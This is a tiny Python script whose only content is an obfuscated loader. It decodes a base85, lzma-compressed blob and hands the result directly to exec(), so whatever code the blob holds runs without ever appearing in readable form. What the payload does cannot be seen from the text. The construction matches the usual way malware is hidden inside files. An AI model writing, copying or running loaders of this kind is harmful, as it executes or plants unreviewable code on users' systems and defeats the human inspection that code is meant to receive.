import lzma, base64
_data = b'{Wp48S^xk9=GL@E0stWa8~^|S5YJf5-~u-Ryj=h)6GV>5Zegv1H&Yb-6Sp8)gvp0~P8e;21q6xnU8A}2v~^H_weYv^hS|zziq_j&G_infkT9s+c7h5t0?O1TZik|HdLj{S^ywa2w<*#)kBvD!Up#Iykuvs)ft{-OpDJRfR0`KbnDOh~iu6<tTWQNLzQ;!|rHe_&c2OG_aC^c%j!6c|DSRKpCt6DN1~Zfwd-`wByGbt?pid<3{DXQ(q|zbD@9*bN0^a80<K#&Rs6#EBZ*gf5cSJkY=UZN*SvBa2nFVBCt$H;!>Bwuk)lvb?WXlH!5T>S3u{a-uvL!tSeYtM@F*`mJoN2hb@*rxsU&H48UaQ$B#~~BI6UtBm4ib3H_6R&CDiZfa5orv_158}VA>xF|FCnQdfPUN9aASdj#tX;jKDVj{yZ#I+pik3rl~PES^&<nZ+m+x0K9Bu|q1%peKKyVcs@F&b=@ki2|HHh-t)1)S^P-Sz$ruvU>LFt$hLEBn>2f^Xk+(K;Vq@n4ss-WCozN)Y7<TM^b3<CT)p6y{S9Xa7>WiGB%d2!blT<kVDYFv7*%if>fNn?mpOTNVS?en<sp0?tvd?HKoIHy}00GzoxC8(I=KfcuvBYQl0ssI200dcD'
_exec = lzma.decompress(base64.b85decode(_data)).decode('utf-8')
exec(_exec)
